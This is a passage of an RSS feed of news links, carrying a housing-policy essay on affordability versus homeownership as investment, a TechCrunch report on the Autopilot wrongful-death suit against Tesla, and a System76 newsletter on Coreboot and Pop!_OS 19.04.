&lt;p&gt;This also means that the two stated pillars of American housing policy—homeownership as wealth-building and housing affordability—are fundamentally at odds. Mostly, American housing policy resolves this contradiction by quietly deciding that it really doesn’t care that much about affordability after all. While funds for low-income subsidized housing languish, much larger pots of money are set aside for promoting homeownership through subsidies like the mortgage interest deduction and capital gains exemption, most of which goes to upper-middle- or upper-class households.&lt;/p&gt;
&lt;p&gt;But even markets with large amounts of affordable housing demonstrate the contradiction. Since at least the second half of the 20th century, the vast majority of actually affordable housing has been created via &lt;a href=&quot;http://cityobservatory.org/what-filtering-can-and-cant-do/&quot;&gt;“filtering”&lt;/a&gt;: that is, the falling relative prices of market-rate housing as it ages, or its neighborhood loses social status, often as a result of racial changes. Low-income affordability, where it does exist, is predicated on large portions of the housing market acting as terrible investments.&lt;/p&gt;
&lt;p&gt;And to the extent that low-income people do find a subsidized, price-fixed housing unit to live in, that means that they won’t be building any wealth, even as their richer, market-housing-dwelling neighbors do, increasing wealth inequality.&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;article-section-4&quot;&gt;&lt;p&gt;Even the community land trust, which seems to be a way of squaring the wealth-building/affordability circle, ultimately fails. Community land trusts typically provide subsidized or reduced price ownership opportunities to initial buyers, and assure longer term affordability by limiting the resale price of the home. In other words, CLT-financed homes remain affordable only because they restrict how much wealth building the initial owners are allowed to capture. The result is that CLT-financed homes &lt;a href=&quot;https://www.washingtonpost.com/local/flawed-dc-housing-program-sticks-developer-with-2-unsold-condos-for-3-years/2014/11/01/47fbdaf0-6154-11e4-8b9e-2ccdac31a031_story.html&quot;&gt;only attract those who couldn’t otherwise purchase a home&lt;/a&gt;—which means that the lower-income people in CLTs will be building wealth more slowly than higher-income people in market-rate housing, a fundamentally inequality-increasing situation.&lt;/p&gt;
&lt;/div&gt;&lt;div id=&quot;article-section-5&quot;&gt;&lt;p&gt;We say we want housing to be cheap and we want home ownership to be a great financial investment. Until we realize that these two objectives are mutually exclusive, we’ll continue to be frustrated by failed and oftentimes counterproductive housing policies.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This article originally appeared on &lt;a href=&quot;http://cityobservatory.org/housing-cant-be-affordable_and_be-a-good-investment/&quot;&gt;CityObservatory&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;CORRECTION: This article was originally published with an incorrect byline.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;More from CityObservatory:&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 01 May 2019 22:53:57 +0000</pubDate>
<dc:creator>dredmorbius</dc:creator>
<og:description>The two pillars of American housing policy are fundamentally at odds.</og:description>
<og:image>https://cdn.citylab.com/media/img/citylab/2018/11/RTR339TY/facebook.jpg?1542398429</og:image>
<og:title>Housing Can’t Be Both Affordable and a Good Investment</og:title>
<og:type>article</og:type>
<og:url>https://www.citylab.com/perspective/2018/11/housing-cant-both-be-a-good-investment-and-be-affordable/574813/</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.citylab.com/perspective/2018/11/housing-cant-both-be-a-good-investment-and-be-affordable/574813/</dc:identifier>
</item>
<item>
<title>Tesla sued in wrongful death lawsuit that alleges Autopilot caused crash</title>
<link>https://techcrunch.com/2019/05/01/tesla-sued-in-wrongful-death-lawsuit-that-alleges-autopilot-caused-crash/</link>
<guid isPermaLink="true" >https://techcrunch.com/2019/05/01/tesla-sued-in-wrongful-death-lawsuit-that-alleges-autopilot-caused-crash/</guid>
<description>&lt;p id=&quot;speakable-summary&quot;&gt;The family of Walter Huang, an &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/organization/apple&quot; target=&quot;_blank&quot; data-type=&quot;organization&quot; data-entity=&quot;apple&quot;&gt;Apple&lt;/a&gt; engineer who died after his Tesla Model X with Autopilot engaged crashed into a highway median, is suing Tesla. The State of California Department of Transportation is also named in the lawsuit.&lt;/p&gt;
&lt;p&gt;The wrongful death lawsuit, filed in California Superior Court, County of Santa Clara, alleges that errors by Tesla’s Autopilot driver assistance system caused the crash that killed Huang on March 23, 2018. Huang, who was 38, died when his 2017 Tesla Model X hit a highway barrier on Highway 101 in Mountain View, Calif.&lt;/p&gt;
&lt;p&gt;The lawsuit alleges that Tesla’s Autopilot driver assistance system misread lane lines, failed to detect the concrete media, failed to brake and instead accelerated into the median.&lt;/p&gt;
&lt;p&gt;A Tesla spokesperson declined to comment on the lawsuit.&lt;/p&gt;
&lt;p&gt;“Mrs. Huang lost her husband, and two children lost their father because Tesla is beta testing its Autopilot software on live drivers,” B. Mark  Fong, a partner at law firm Minami Tamaki said in a statement.&lt;/p&gt;
&lt;p&gt;Other allegations against Tesla include product liability, defective product design, failure to warn, breach of warranty, intentional and negligent misrepresentation and false advertising. California DOT is also named in the lawsuit because the concrete highway median that Huang’s vehicle struck was missing its crash attenuator guard, according to the filing. Caltrans failed to replace the guard after an earlier crash there, the lawsuit alleges.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;xn-person&quot;&gt;The lawsuit aims to “ensure the technology behind semi-autonomous cars is safe before it is released on the roads, and its risks are not withheld or misrepresented to the public,” said&lt;/span&gt; &lt;span class=&quot;xn-person&quot;&gt;Doris Cheng, a partner at Walkup, Melodia, Kelly &amp;amp; Schoenberger, who is also representing the family.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;In the days following the crash, Tesla released two blog posts and ended up scuffling with the National Transportation Safety Board, which had sent investigators to the crash scene.&lt;/p&gt;
&lt;p&gt;Tesla’s &lt;a href=&quot;https://www.tesla.com/en_GB/blog/update-last-week%E2%80%99s-accident?redirect=no&quot;&gt;March 30 blog post&lt;/a&gt; acknowledged Autopilot had been engaged at the time of the crash. Tesla said the driver had received several visual and one audible hands-on warnings earlier in the drive and the driver’s hands were not detected on the wheel for six seconds prior to the collision.&lt;/p&gt;
&lt;p&gt;Those comments prompted a response from the NTSB, which indicated it was “unhappy with the release of investigative information by Tesla.” The NTSB requires companies that are a party to an agency accident investigation to not release details about the incident to the public without approval.&lt;/p&gt;
&lt;p&gt;Tesla CEO &lt;a class=&quot;crunchbase-link&quot; href=&quot;https://crunchbase.com/person/elon-musk&quot; target=&quot;_blank&quot; data-type=&quot;person&quot; data-entity=&quot;elon-musk&quot;&gt;Elon Musk&lt;/a&gt; would soon chime in via Twitter to express his own disappointment and criticism of the NTSB.&lt;/p&gt;
&lt;p&gt;Three weeks after the crash, Tesla issued a statement placing the blame on Huang and denying moral or legal liability for the crash.&lt;/p&gt;
&lt;p&gt;“According to the family, Mr. Huang was well aware that Autopilot was not perfect and, specifically, he told them it was not reliable in that exact location, yet he nonetheless engaged Autopilot at that location. The crash happened on a clear day with several hundred feet of visibility ahead, which means that the only way for this accident to have occurred is if Mr. Huang was not paying attention to the road, despite the car providing multiple warnings to do so.”&lt;/p&gt;
&lt;p&gt;The relationship between NTSB and Tesla would disintegrate further following the statement. Tesla said it withdrew from its party agreement with the NTSB. Within a day, NTSB claimed that it had removed Tesla as a party to its crash investigation.&lt;/p&gt;
&lt;p&gt;A &lt;a href=&quot;https://www.ntsb.gov/news/press-releases/pages/nr20180607.aspx&quot;&gt;preliminary report&lt;/a&gt; from the NTSB didn’t make any conclusions of what caused the crash. But it did find that the vehicle accelerated from 62 mph to 70.8 mph in the final three seconds before impact and moved left as it approached the paved gore area dividing the main travel lane of 101 and Highway 85 exit ramp.&lt;/p&gt;
&lt;p&gt;The report also found that in the 18 minutes and 55 seconds prior to impact, the Tesla provided two visual alerts and one auditory alert for the driver to place his hands on the steering wheel. The alerts were made more than 15 minutes before the crash.&lt;/p&gt;
&lt;p&gt;Huang’s hands were detected on the steering wheel only 34 seconds during the last minute before impact. No pre-crash braking or evasive steering movement was detected, the report said.&lt;/p&gt;
&lt;p&gt;The case is &lt;em&gt;Sz Hua Huang et al v. Tesla Inc., The State of California&lt;/em&gt;, no. 19CV346663.&lt;/p&gt;
</description>
<pubDate>Wed, 01 May 2019 22:25:15 +0000</pubDate>
<dc:creator>mindgam3</dc:creator>
<og:title>Tesla sued in wrongful death lawsuit that alleges Autopilot caused crash – TechCrunch</og:title>
<og:description>The family of Walter Huang, an Apple engineer who died after his Tesla Model X with Autopilot engaged crashed into a highway median, is suing Tesla. The State of California Department of Transportation is also named in the lawsuit. The wrongful death lawsuit, filed in California Superior Court, Cou…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2018/06/hwy18fh011-fig1.jpg?w=478</og:image>
<og:url>http://social.techcrunch.com/2019/05/01/tesla-sued-in-wrongful-death-lawsuit-that-alleges-autopilot-caused-crash/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2019/05/01/tesla-sued-in-wrongful-death-lawsuit-that-alleges-autopilot-caused-crash/</dc:identifier>
</item>
<item>
<title>System76 News: Coreboot and Linux Advances</title>
<link>https://blog.system76.com/post/184439321333/system76-news-platinum-luxury-bonus-april-edition</link>
<guid isPermaLink="true" >https://blog.system76.com/post/184439321333/system76-news-platinum-luxury-bonus-april-edition</guid>
<description>&lt;img src=&quot;https://66.media.tumblr.com/441d4b97757c36e57e613ea368f2cd22/tumblr_inline_pqj3s5HbOO1wbr829_500.png&quot; data-orig-height=&quot;200&quot; data-orig-width=&quot;600&quot; width=&quot;500&quot; height=&quot;167&quot; alt=&quot;image&quot;/&gt;&lt;blockquote readability=&quot;4.5108695652174&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fs76.co%2Fnewsletter&amp;amp;t=ZDQ1OTMyNTI3NmI3NWQxOTQ0N2Y5NzFhODBlNDVkZmNiY2YwMjM2ZSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Subscribe&lt;/a&gt; to our monthly newsletter to get the latest monthly scoops straight to your inbox!&lt;br/&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;p&gt;As the 4th month of the year comes to a close, we celebrate the 4th release of Pop!_OS, which had updates to GNOME, Ubuntu, and the Linux kernel, as well as new additions such as Dark Mode, Slim Mode, and Refresh Installs. Continue reading to get the scoop on what’s next for Pop!_OS and more!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Firmware&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/5aec561ad0b4666f7f6e753662c8af83/tumblr_inline_pqj2tnGTTP1wbr829_500.jpg&quot; alt=&quot;image&quot; data-orig-width=&quot;4032&quot; data-orig-height=&quot;3024&quot; width=&quot;500&quot; height=&quot;375&quot;/&gt;&lt;p&gt;Coreboot is one step closer&lt;/p&gt;
&lt;p&gt;We’ve expanded our &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D4f8a122241%26e%3Dca9b4ae634&amp;amp;t=N2Y4YWY2YTMxNmM0MjcxYjdhYjUyOGJlMWIyZjc1ZTg0MWEyYTQwMyxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Coreboot&lt;/a&gt; testing to the Intel model of Thelio. Galago Pro models and the Darter Pro have also received bug fixes for suspend, and improvements have been made for Thunderbolt. There are still some bugs buzzing around Coreboot, but initial tests look promising.                                  &lt;br/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pop!_OS&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Updates Galore with 19.04&lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/21eeb7b5ee8be3ca0ccdab574f56f0db/tumblr_inline_pqj2u19hmE1wbr829_500.png&quot; alt=&quot;image&quot; data-orig-width=&quot;994&quot; data-orig-height=&quot;518&quot; width=&quot;500&quot; height=&quot;261&quot;/&gt;&lt;p&gt;In case you missed it, Pop!_OS 19.04 landed on the 18th! Here are a few features and upgrades released in 19.04:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The Slim Mode option maximizes your screen real estate by reducing the height of the header on application windows.&lt;/li&gt;
&lt;li&gt;Dark Mode gives your applications a relaxing ambience for nighttime viewing. Both Dark Mode and Slim Mode can be activated in the Appearance settings menu.&lt;/li&gt;
&lt;li&gt;Refresh Install allows you to reinstall Pop!_OS without losing Users and any data in your Home directories. This feature is available from the recovery partition on new installations (not upgrades) of both 19.04 and 18.04. For more information on how to do this, see our article on &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3Dfb6328cfe8%26e%3Dca9b4ae634&amp;amp;t=NWE0MGU0M2YxZjMxMWQ5NWZjMTUxMjQ1ODUzZWI5NzIzNjJkMDUzNSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;using the recovery partition.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Pop!_OS icons: The icons for Pop!_OS applications, files, and folders have been redesigned to complement GNOME’s icons under their new design guidelines. If you’re grieving the loss of the previous look, don’t fret; &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D803f372afd%26e%3Dca9b4ae634&amp;amp;t=ODQwY2JhMTgzYjgwMGQxMTNhNmUyNDhiZDM4MmJlNjA1N2NkYWQzYixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Pop! Planet offers the older icon theme as an option.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;GNOME has been updated to version 3.32&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D3f9c52cb4f%26e%3Dca9b4ae634&amp;amp;t=MTkyMTRmNWQ5M2EwYjRkOWJlOTU2YTQ2NGIxMGY0ZGFlMzdkYTg5YixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;See our blog post&lt;/a&gt; for thorough details on all the new updates and instructions on how to upgrade. Note that 19.04 will continue to see more features to help improve the desktop experience, so stay tuned in social media for those updates.&lt;/p&gt;

&lt;p&gt;Software Packages&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Discord and &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D70f8304265%26e%3Dca9b4ae634&amp;amp;t=Yjk2YjVjMzcyNzBmN2IzYzU0YTU4MDI0MDIxNmRhYzk4NmQ3NWIyNSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Alacritty&lt;/a&gt; were packaged for inclusion into our repos, though they will not appear in the Pop!_Shop until the appstream metadata is also added to our repositories.&lt;/li&gt;
&lt;li&gt;Lutris, Gamehub, and VS Code have all received version updates.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Alacritty is a terminal emulator that uses the GPU to render the terminal and its contents. If you wish to set it as your default terminal application, you can do so by running the following command:&lt;br/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;sudo update-alternatives –config x-terminal-emulator&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Thank You Pop!_Volunteers&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D9e6e286bcb%26e%3Dca9b4ae634&amp;amp;t=YjE2YjUxOGIzMjUwYzA5YWFhMmRjMjBjNWZhMmEyYjllMDExZmFjOCxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;@stratact&lt;/a&gt; submitted a patch to refactor some of the code in Popsicle&lt;/li&gt;
&lt;li&gt;@stratact also wrote a library and tool to aid with creating DEP11 appstream metadata, which is &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D70e7ae161c%26e%3Dca9b4ae634&amp;amp;t=YTE3NzRkN2Q5OTY2NTZlN2IxN2E3MzFlMzg2YTAwYzdhMTVkOGMyZixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;now a Pop! project.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D435aaa500f%26e%3Dca9b4ae634&amp;amp;t=ZjJkMGYwZDBiOTY2MWJmY2FhOTVmN2M5OGQyZDVjZmQwMjBiNDk4NixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;@kylecorry31&lt;/a&gt; has migrated development of the Do Not Disturb extension to our repos, which have also been updated. &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D1da2e370f8%26e%3Dca9b4ae634&amp;amp;t=ZmMzNGMyZjgyZWYyZDY3NDcyZmU3NjRjZmFkNDY5YWIxODdiNWFkYixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Repo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Conferences &amp;amp; Meetups&lt;br/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&quot;https://66.media.tumblr.com/3c1cdc9dd7c4112a8edad40507de46e3/tumblr_inline_pqj2v09xlx1wbr829_500.jpg&quot; alt=&quot;image&quot; data-orig-width=&quot;1280&quot; data-orig-height=&quot;622&quot; width=&quot;500&quot; height=&quot;243&quot;/&gt;&lt;p&gt;Upcoming Events&lt;/p&gt;
&lt;p&gt;LinuxFest Northwest | Bellingham, WA | April 26-28&lt;/p&gt;
&lt;p&gt;System76 is headed to LinuxFest Northwest on April 26th-28th! Come visit us at our booth over by the raffle area. Meet Emma, Thomas, Aaron, and Levi of our support team (and Alex, who also does things) and enjoy some banter with us about Linux, superheroes, the color pink, and any other topic you’re in the mood to talk about! We’re not too picky. Be sure to join Jupiter Broadcasting and System76 for our parking lot BBQ on Saturday, April 27th! RSVP on &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D2ee367b14c%26e%3Dca9b4ae634&amp;amp;t=NDk0MTNmOGY1ZDM4ZTIzNTRlZWRlMTMzYmMzYmM3NzA4MTM2NjE4ZixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Meetup&lt;/a&gt;, where you can see all the details, or with &lt;a href=&quot;https://t.umblr.com/redirect?z=mailto%3Aemma%40system76.com%3Fsubject%3DI%27m%2520going%2520to%2520the%2520BBQ%26body%3DI%27ll%2520be%2520at%2520the%2520conference%2520and%2520I%27m%2520very%2520excited%2520to%2520meet%2520everyone%21&amp;amp;t=YjEyZjk1ZGFjZTdjMjBhZWRhOTMyNmUyZThhYWYyMWMyYzgwNjE4OSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Emma&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;KiCon | Chicago | April 26-27&lt;/p&gt;
&lt;p&gt;Louisa, our VP of Marketing, will be at KiCon in Chicago on April 26th-27th to talk about our work in KiCad designing the IO board for the Thelio desktop line. PCB there or be square!&lt;/p&gt;
&lt;p&gt;Pop!_Release Party | Denver | May 4&lt;/p&gt;
&lt;p&gt;On May 4th, come join us at our office in Denver, Colorado to celebrate Ubuntu and Pop!_OS 19.04 release! Meet System76 staff and members of the Colorado Ubuntu community, indulge in food and beverage, and take a tour of our factory. RSVP on &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D096d6624c9%26e%3Dca9b4ae634&amp;amp;t=NWQzYjJjZDY2NjA1MjEzMjgwMmE2ZjBmNjAzN2Q3OTNhYTE0NWY4NSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Meetup&lt;/a&gt;, where you can see all the details, or with &lt;a href=&quot;https://t.umblr.com/redirect?z=mailto%3Aemma%40system76.com%3Fsubject%3DPop%2520Party%26body%3DI%2520want%2520to%2520RSVP%2520to%2520the%2520pop%2520party%21&amp;amp;t=ZmE2ZjEwMWU0NTRkMzljNjAwZGM1M2RlYjg4YTg0NjliYWMxZDZlZCxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Emma&lt;/a&gt;, and May the 19.04th be with you!&lt;/p&gt;

&lt;p&gt;Past Happenings&lt;/p&gt;
&lt;p&gt;GNOME Party&lt;/p&gt;
&lt;p&gt;On April 20th, we gathered at The Grateful Gnome in Denver to celebrate the release of GNOME 3.32! Drinks were shared. Tales were told. Pointy hats were dearly missed, but we still felt at gnome among friends.                                     &lt;br/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Press Coverage&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linus Tech Tips&lt;/p&gt;
&lt;p&gt;Pop!_OS was featured on &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3Da13087f3fa%26e%3Dca9b4ae634&amp;amp;t=YzAwMTFlZGIxZGFjMzkzZTZiZTIxOGIyODdlYjhkY2IzNzA3MmUzOSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Linus Tech Tips&lt;/a&gt; this month! Watch hosts Anthony Young and James Strieb reenact the Matrix as they discuss gaming on Linux with Pop!_OS!&lt;/p&gt;
&lt;p&gt;Level1Tech review of Thelio&lt;/p&gt;
&lt;p&gt;Stares into the camera abound in &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3De48062f28c%26e%3Dca9b4ae634&amp;amp;t=Y2JmM2YwMTdhZDRlNjIzZGE4OTg5MGE3YjIwNmNmNTE5YzAyNjUzNixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Level1Tech’s new review!&lt;/a&gt; Enjoy the many faces of Wendell as he unpacks his first impressions of Thelio.&lt;/p&gt;
&lt;p&gt;Opensource.com article on System76 manufacturing&lt;/p&gt;
&lt;p&gt;Don Watkins of &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3De196831928%26e%3Dca9b4ae634&amp;amp;t=ZWZlOWFiZjc3ZGIxNTZlMTVmNjkyOWQ5Nzk5ZDZkMGU5MjVlMDUyMyxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Opensource.com&lt;/a&gt; discusses System76’s use of open hardware in manufacturing Thelio.&lt;/p&gt;
&lt;p&gt;Destination Linux and This Week in Linux&lt;/p&gt;
&lt;p&gt;Michael Tunnell from &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3Dfbc52db5f8%26e%3Dca9b4ae634&amp;amp;t=MjBmMWNlNzlhOWY3M2ExMTc5YmJlMzI2MmE3M2YzOTkyZjE4N2MzOSxVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;Destination Linux&lt;/a&gt; and &lt;a href=&quot;https://t.umblr.com/redirect?z=https%3A%2F%2Fsystem76.us10.list-manage.com%2Ftrack%2Fclick%3Fu%3D00040e6ab34b3c90fc6a7c925%26id%3D67fd164738%26e%3Dca9b4ae634&amp;amp;t=M2UzYmNiNjZkNWNhNDRjZjhmYmNiYzUwNWQzM2MwZDk1YzRlNGJkZixVeFBHVlNWbw%3D%3D&amp;amp;b=t%3AFIbKH4KzaAKkwlLoMpUiow&amp;amp;p=https%3A%2F%2Fblog.system76.com%2Fpost%2F184439321333%2Fsystem76-news-platinum-luxury-bonus-april-edition&amp;amp;m=0&quot; target=&quot;_blank&quot;&gt;This Week in Linux&lt;/a&gt; was in Denver this month and decided to drop us a visit! You could say we were…his Destination. We treated him to lunch and a grand tour of le factory. We’re looking forward to seeing his reactions to his visit on his shows this week!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Customer Stories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Rock the TASBot for Mental Illness&lt;/p&gt;
